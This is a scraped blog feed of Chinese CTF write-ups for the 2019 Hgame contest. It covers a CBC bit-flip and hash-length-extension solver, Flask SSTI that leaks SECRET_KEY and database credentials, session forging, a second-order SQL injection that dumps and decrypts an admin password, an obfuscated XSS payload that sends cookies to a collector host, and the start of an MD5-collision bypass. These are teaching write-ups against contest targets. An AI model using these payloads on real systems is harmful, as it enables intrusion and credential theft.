class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">"47.95.212.185"</span> ,<span class="number">38611</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username)</span>:</span></span><br><span class="line">    con.sendlineafter(<span class="string">"Login\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">    con.sendlineafter(<span class="string">"(hex): "</span>,username.encode(<span class="string">"hex"</span>))</span><br><span class="line">    con.recvuntil(<span class="string">"is: "</span>)</span><br><span class="line">    <span class="keyword">return</span> con.recvline().strip()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(username)</span>:</span></span><br><span class="line">    token = register(username).decode(<span class="string">"hex"</span>)</span><br><span class="line">    <span class="keyword">return</span> token[:<span class="number">-16</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    cipher +=<span class="string">"a"</span>*<span class="number">16</span></span><br><span class="line">    con.sendlineafter(<span class="string">"Login\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">    con.sendlineafter(<span class="string">"token: "</span>,cipher.encode(<span class="string">"hex"</span>))</span><br><span class="line">    con.recvuntil(<span class="string">"(hex) "</span>)</span><br><span class="line">    data = con.recvuntil(<span class="string">"admin"</span>.encode(<span class="string">"hex"</span>))</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="string">"010101010101010101010101010101018000000000000000000000000000000000000000000000000001000000000000"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line">target = ord(<span class="string">"n"</span>)</span><br><span class="line">mask = <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span>(target^mask != target)</span><br><span class="line">flag = <span class="keyword">True</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">s+=<span class="string">"\xff"</span>*<span class="number">16</span>+<span class="string">"admi"</span>+chr(target^mask)</span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(cnt %<span class="number">200</span> ==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">print</span> cnt</span><br><span class="line">    flag = <span class="keyword">False</span> </span><br><span class="line">    cipher1 = encrypt(s)</span><br><span class="line">    cipher2 =cipher1[:<span class="number">-32</span>]+cipher1[<span class="number">-32</span>:<span class="number">-28</span>]+chr(ord(cipher1[<span class="number">-28</span>])^mask)+cipher1[<span class="number">-27</span>:<span class="number">-16</span>]+cipher1[<span class="number">-16</span>:] </span><br><span class="line"></span><br><span class="line">    pp = decrypt(cipher2)</span><br><span class="line">    pp = pp.strip(<span class="string">"admin"</span>)</span><br><span class="line">    pp = pp[<span class="number">-16</span>:]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> pp:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.printable:</span><br><span class="line">            flag = <span class="keyword">True</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">s = decrypt(cipher2)</span><br><span class="line">name =<span class="string">"\x01"</span>*<span class="number">16</span></span><br><span class="line">sig1 = register(name)[<span class="number">-32</span>:]</span><br><span class="line">tmp = hashpumpy.hashpump(sig1, <span class="string">'01010101010101010101010101010101'</span>.decode(<span class="string">'hex'</span>), s[<span class="number">48</span>:], <span class="number">16</span>)</span><br><span class="line">sig2=tmp[<span class="number">0</span>]</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">con.sendlineafter(<span class="string">"Login\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">payload = cipher2.encode(<span class="string">"hex"</span>)+sig2</span><br><span class="line">con.sendlineafter(<span class="string">"token: "</span>,payload)</span><br><span class="line">con.interactive()</span><br></pre></td></tr></table></figure></p><p>运行得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;hard_cryptooooo!&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-20-13-07-17.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>算是Hash Length Extension Attacks进阶版的题目吧，CBC那一块还算比较简单，前后思考了很久，学到不少知识XD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/technology/16343.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;为了防止整天沉迷switch智力降低，于是刷了一道有意思的Crypto题，其中涉及大概2个考点：Hash Length Extension 
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2019-Hgame-Web-Week4</title>
    <link href="http://skysec.top/2019/02/18/2019-Hgame-Web-Week4/"/>
    <id>http://skysec.top/2019/02/18/2019-Hgame-Web-Week4/</id>
    <published>2019-02-18T01:03:53.000Z</published>
    <updated>2019-02-24T06:38:05.259Z</updated>
    
    <content type="html"><![CDATA[<h2 id="happyPython"><a href="#happyPython" class="headerlink" title="happyPython"></a>happyPython</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>发现是flask，随手测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:3001/&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-18-09-06-49.png" alt=""><br>发现可能存在SSTI，打了几发payload，发现都是500，想到测试一下过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:3001/%7B%7B&apos;aa&apos;.upper()%7D%7D</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-18-09-35-49.png" alt=""><br>发现将<code>()</code>替换成了空<br><img src="/images/2019-02-18-09-38-46.png" alt=""></p><h3 id="SECRET-KEY-获取"><a href="#SECRET-KEY-获取" class="headerlink" title="SECRET_KEY`获取"></a>SECRET_KEY`获取</h3><p>那么执行命令应该变得非常困难，但是发现网站有登录，注册功能<br>随手解了一下session<br><img src="/images/2019-02-18-09-08-25.png" alt=""><br>猜测可能要伪造<code>user_id=1</code><br>那么不能执行命令，我们可以进行信息读取，获得<code>SECRET_KEY</code><br>探测了一下过滤，发现<code>url_for</code>还存在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:3001/%7B%7Burl_for%7D%7D</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-20-09-23-45.png" alt=""><br>进一步了解一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__</span><br></pre></td></tr></table></figure><p><img src="/images/2019-02-20-09-24-31.png" alt=""><br>发现已经是<code>&lt;Flask &#39;app&#39;&gt;</code>，继续深入一下，读config<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&apos;current_app&apos;].config</span><br></pre></td></tr></table></figure></p><p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;&apos;ENV&apos;: &apos;production&apos;, &apos;DEBUG&apos;: False, &apos;TESTING&apos;: False, &apos;PROPAGATE_EXCEPTIONS&apos;: None, &apos;PRESERVE_CONTEXT_ON_EXCEPTION&apos;: None, &apos;SECRET_KEY&apos;: &apos;9RxdzNwq7!nOoK3*&apos;, &apos;PERMANENT_SESSION_LIFETIME&apos;: datetime.timedelta(31), &apos;USE_X_SENDFILE&apos;: False, &apos;SERVER_NAME&apos;: None, &apos;APPLICATION_ROOT&apos;: &apos;/&apos;, &apos;SESSION_COOKIE_NAME&apos;: &apos;session&apos;, &apos;SESSION_COOKIE_DOMAIN&apos;: False, &apos;SESSION_COOKIE_PATH&apos;: None, &apos;SESSION_COOKIE_HTTPONLY&apos;: True, &apos;SESSION_COOKIE_SECURE&apos;: False, &apos;SESSION_COOKIE_SAMESITE&apos;: None, &apos;SESSION_REFRESH_EACH_REQUEST&apos;: True, &apos;MAX_CONTENT_LENGTH&apos;: None, &apos;SEND_FILE_MAX_AGE_DEFAULT&apos;: datetime.timedelta(0, 43200), &apos;TRAP_BAD_REQUEST_ERRORS&apos;: None, &apos;TRAP_HTTP_EXCEPTIONS&apos;: False, &apos;EXPLAIN_TEMPLATE_LOADING&apos;: False, &apos;PREFERRED_URL_SCHEME&apos;: &apos;http&apos;, &apos;JSON_AS_ASCII&apos;: True, &apos;JSON_SORT_KEYS&apos;: True, &apos;JSONIFY_PRETTYPRINT_REGULAR&apos;: False, &apos;JSONIFY_MIMETYPE&apos;: &apos;application/json&apos;, &apos;TEMPLATES_AUTO_RELOAD&apos;: None, &apos;MAX_COOKIE_SIZE&apos;: 4093, &apos;CSRF_ENABLED&apos;: True, &apos;SQLALCHEMY_DATABASE_URI&apos;: &apos;mysql+pymysql://hgame:asdkjhiou12312451r2@127.0.0.1:3306/hgame&apos;, &apos;SQLALCHEMY_TRACK_MODIFICATIONS&apos;: True, &apos;WTF_CSRF_ENABLED&apos;: True, &apos;WTF_CSRF_CHECK_DEFAULT&apos;: True, &apos;WTF_CSRF_METHODS&apos;: &#123;&apos;PUT&apos;, &apos;DELETE&apos;, &apos;POST&apos;, &apos;PATCH&apos;&#125;, &apos;WTF_CSRF_FIELD_NAME&apos;: &apos;csrf_token&apos;, &apos;WTF_CSRF_HEADERS&apos;: [&apos;X-CSRFToken&apos;, &apos;X-CSRF-Token&apos;], &apos;WTF_CSRF_TIME_LIMIT&apos;: 3600, &apos;WTF_CSRF_SSL_STRICT&apos;: True, &apos;SQLALCHEMY_BINDS&apos;: None, &apos;SQLALCHEMY_NATIVE_UNICODE&apos;: None, &apos;SQLALCHEMY_ECHO&apos;: False, &apos;SQLALCHEMY_RECORD_QUERIES&apos;: None, &apos;SQLALCHEMY_POOL_SIZE&apos;: None, &apos;SQLALCHEMY_POOL_TIMEOUT&apos;: None, &apos;SQLALCHEMY_POOL_RECYCLE&apos;: None, &apos;SQLALCHEMY_MAX_OVERFLOW&apos;: None, &apos;SQLALCHEMY_COMMIT_ON_TEARDOWN&apos;: False&#125;&gt;</span><br></pre></td></tr></table></figure></p><p>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;SECRET_KEY&apos;: &apos;9RxdzNwq7!nOoK3*&apos;</span><br></pre></td></tr></table></figure></p><h3 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h3><p>我们进行session伪造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;csrf_token&apos;: u&apos;f02a02e70216e476480f9f2be9a07eb76b96f7a5&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;1&apos;, u&apos;_id&apos;: u&apos;91fa5db15d7b2b86be894999458190d9722d7d7aa0d5236363f921f34c7c17e63c21877fccb83bcb26984e9cac4bd72bc1dcb7750634b0997524cd3d2d9ac3f6&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>这里直接改user_id不行，本以为有csrf_token，我们需得到下一次csrf_token再伪造<br><img src="/images/2019-02-18-13-02-53.png" alt=""><br>此时解密可以得到当前csrf_token<br><img src="/images/2019-02-18-13-03-15.png" alt=""><br>进行伪造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session encode -s &apos;9RxdzNwq7!nOoK3*&apos; -t &quot;&#123;u&apos;csrf_token&apos;: u&apos;322ad6ee5c7fb9984464d472c7dadc35e4501756&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;1&apos;, u&apos;_id&apos;: u&apos;91fa5db15d7b2b86be894999458190d9722d7d7aa0d5236363f921f34c7c17e63c21877fccb83bcb26984e9cac4bd72bc1dcb7750634b0997524cd3d2d9ac3f6&apos;&#125;&quot;</span><br></pre></td></tr></table></figure></p><p>但是发现仍然不行，这里尝试Python3，发现成功<br><img src="/images/2019-02-18-13-38-38.png" alt=""><br><img src="/images/2019-02-18-13-38-21.png" alt=""><br>得到flag:<code>hgame{Qu_bu_la1_m1ng_z1_14}</code><br>(注：至于为什么python2不行，python3可以，可以去参考这篇文章<a href="https://www.anquanke.com/post/id/163975，之前HCTF已踩坑" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163975，之前HCTF已踩坑</a>)</p><h2 id="happyPHP"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>F12发现源代码有信息泄露<br><img src="/images/2019-02-18-09-41-50.png" alt=""><br>下载源码后直接搜索flag<br><img src="/images/2019-02-18-09-58-56.png" alt=""><br>发现需要变成<code>id=1</code>的用户才会得到flag</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>同时发现高危操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure></p><p>没有经过过滤，直接拼接name<br>容易想到二次注入，这里注册用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1‘ or &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p>得到结果<br><img src="/images/2019-02-18-10-00-04.png" alt=""><br>发现可以注入，思考需要注入的value<br>这里我直接认为注入id=1用户的密码是没有作用的(后来发现就是注密码= =)，我们发现这里的密码已加密<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$user = User::create([</span><br><span class="line">            <span class="string">'name'</span> =&gt; $request-&gt;name,</span><br><span class="line">            <span class="string">'email'</span> =&gt; $request-&gt;email,</span><br><span class="line">            <span class="string">'password'</span> =&gt; encrypt($request-&gt;password),</span><br><span class="line">        ]);</span><br></pre></td></tr></table></figure></p><p>我们观察到数据库信息<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Schema::create(<span class="string">'password_resets'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Blueprint $table)</span> </span>&#123;</span><br><span class="line">            $table-&gt;string(<span class="string">'email'</span>)-&gt;index();</span><br><span class="line">            $table-&gt;string(<span class="string">'token'</span>);</span><br><span class="line">            $table-&gt;timestamp(<span class="string">'created_at'</span>)-&gt;nullable();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>发现存在更改密码的table，那么我本以为这里还是和护网杯的一道题如出一辙，注入出id=1用户的token，更改其密码即可<br>随即尝试二次注入，寻找回显点(这里不按照给我们的table字段个数和顺序来，因为上次护网杯被坑过= =,还是自己尝试靠谱)<br>尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysky&apos; order by 1#</span><br></pre></td></tr></table></figure></p><p>发现正常<br>尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysky&apos; order by 2#</span><br></pre></td></tr></table></figure></p><p>发现500，于是确定只有1列(泄露果然不靠谱)，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-18-13-10-11.png" alt=""><br>那么注入password_resets表email和token字段即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select (select email from password_resets)#</span><br></pre></td></tr></table></figure></p><p>结果又500了，出题人给的信息真的一点不能信= =，那么干脆直接注一下users表看看<br>直接注密码尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select (select password from users limit 0,1)#</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==</span><br></pre></td></tr></table></figure></p><p>解码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;iv&quot;:&quot;rnVrqfCvfJgnvSTi9z7KLw==&quot;,&quot;value&quot;:&quot;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&quot;,&quot;mac&quot;:&quot;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af&quot;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="password解密"><a href="#password解密" class="headerlink" title="password解密"></a>password解密</h3><p>到这我才发现前面的密码加密和护网杯那次不一样……容易非常多，也根本不存在password_reset，我说怎么路由里没看见改密码的= =<br>那么继续寻找解密方式<br><img src="/images/2019-02-18-13-27-14.png" alt=""><br>发现没有key，这里需要回滚git<br><img src="/images/2019-02-18-13-28-00.png" alt=""><br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</span><br></pre></td></tr></table></figure></p><p>于是我们已经有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$key=<span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span><br><span class="line">$iv=<span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span><br><span class="line">$c=<span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span><br></pre></td></tr></table></figure></p><p>解密<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(  enc )</span>:</span></span><br><span class="line">    enc = base64.b64decode(enc)</span><br><span class="line">    iv = base64.b64decode(<span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span>)</span><br><span class="line">    cipher = AES.new(base64.b64decode(<span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span>), AES.MODE_CBC, iv )</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt( enc )</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> decrypt(<span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span>)</span><br></pre></td></tr></table></figure></p><p>得到密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9pqfPIer0Ir9UUfR</span><br></pre></td></tr></table></figure></p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>那么只差账号email了<br>我们再去注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select (select email from users wh ere id=1)#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-18-13-36-06.png" alt=""><br>登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@hgame.com</span><br><span class="line">9pqfPIer0Ir9UUfR</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-18-13-36-23.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;2ba146cf-b11c-4512-839f-e1fbf5e759c9&#125;</span><br></pre></td></tr></table></figure></p><h2 id="HappyXss"><a href="#HappyXss" class="headerlink" title="HappyXss"></a>HappyXss</h2><p>这题比较简单，测试发现被过滤，则会被替换成<code>Happy！</code><br><img src="/images/2019-02-18-15-27-45.png" alt=""><br>由于过滤较多，fuzz一下过滤，容易发现残留。这里选择用ascii码拼接的方式bypass：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,50,53,48,48,48,47,63,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59)); autofocus&gt;</span><br></pre></td></tr></table></figure></p><p>(注：这里vps_ip我用127.0.0.1代替)<br><img src="/images/2019-02-19-13-04-28.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Xss_1s_Re@llY_Haaaaaappy!!!&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于 http://www.4hou.com/web/16304.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;happyPython&quot;&gt;&lt;a href=&quot;#happyPython&quot; class=&quot;headerlink&quot; title=&quot;happyPython&quot;&gt;&lt;/a&gt;happyPython&lt;/h2&gt;&lt;h3 id=&quot;信息搜集&quot;&gt;&lt;a href=&quot;#信息搜集&quot; class=&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019-Hgame-Web&amp;Crypto-Week3</title>
    <link href="http://skysec.top/2019/02/10/2019-Hgame-Web&amp;Crypto-Week3/"/>
    <id>http://skysec.top/2019/02/10/2019-Hgame-Web&amp;Crypto-Week3/</id>
    <published>2019-02-10T12:20:40.000Z</published>
    <updated>2019-02-19T04:50:56.582Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h3><p>发现文件泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.89.91:8080/question/.login.php.swp</span><br></pre></td></tr></table></figure></p><p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">'username'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'password'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'code'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">        $code     = (string)$_POST[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input can't be the same"</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Good"</span>; </span><br><span class="line">    </span><br><span class="line">            header(<span class="string">'Location: admin.php'</span>);  </span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt; Invalid password&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>利用工具生成3个相等的Md5<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">'out_test_001.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">f2 = open(<span class="string">'out_test_003.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">f3 = open(<span class="string">'out_test_004.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">url = <span class="string">'http://118.25.89.91:8080/question/login.php'</span></span><br><span class="line">content1 = f1.read()</span><br><span class="line">content2 = f2.read()</span><br><span class="line">content3 = f3.read()</span><br><span class="line">cookie = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:<span class="string">'806a4249b3c9199acda006181261fbdd'</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span 